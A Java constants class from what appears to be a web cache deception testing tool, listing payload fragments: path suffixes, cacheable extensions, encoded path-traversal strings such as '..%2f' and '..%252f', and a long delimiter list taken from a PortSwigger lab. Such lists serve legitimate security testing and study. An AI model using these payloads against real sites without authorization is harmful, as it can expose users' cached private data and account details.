package com.th3h04x.payload;

import lombok.AccessLevel;
import lombok.NoArgsConstructor;

import java.util.List;

@NoArgsConstructor(access = AccessLevel.PRIVATE)
public class WcdPayload {

  public static final List<String> RANDOM_PATH_SUFFIX = List.of("/b", "/b/", "ab");

  public static final List<String> CACHEABLE_EXTENSIONS = List.of(".js",
      ".css",
      ".ico");

  public static final List<String> PATH_NORMALIZATION = List.of("..%2f",
      "..%252f", "%2e%2e%2f");

  //https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list
  public static final List<String> DELIMITER_DISCREPANCIES =
      List.of(
          ";",
          "\"",
          "!",
          "$",
          "%",
          "&",
          "'",
          "(",
          ")",
          "*",
          "+",
          ",",
          "-",
          ".",
          "/",
          ":",
          "#",
          "<",
          "=",
          ">",
          "?",
          "@",
          "[",
          "\\",
          "]",
          "^",
          "_",
          "`",
          "{",
          "|",
          "}",
          "~",
          "%0k", // invalid hex
          "%21",
          "%22",
          "%23",
          "%24",
          "%25",
          "%26",
          "%27",
          "%28",
          "%29",
          "%2A",
          "%2B",
          "%2C",
          "%2D",
          "%2E",
          "%2F",
          "%3A",
          "%3B",
          "%3C",
          "%3D",
          "%3E",
          "%3F",
          "%40",
          "%5B",
          "%5C",
          "%5D",
          "%5E",
          "%5F",
          "%60",
          "%7B",
          "%7C",
          "%7D",
          "%7E");
}
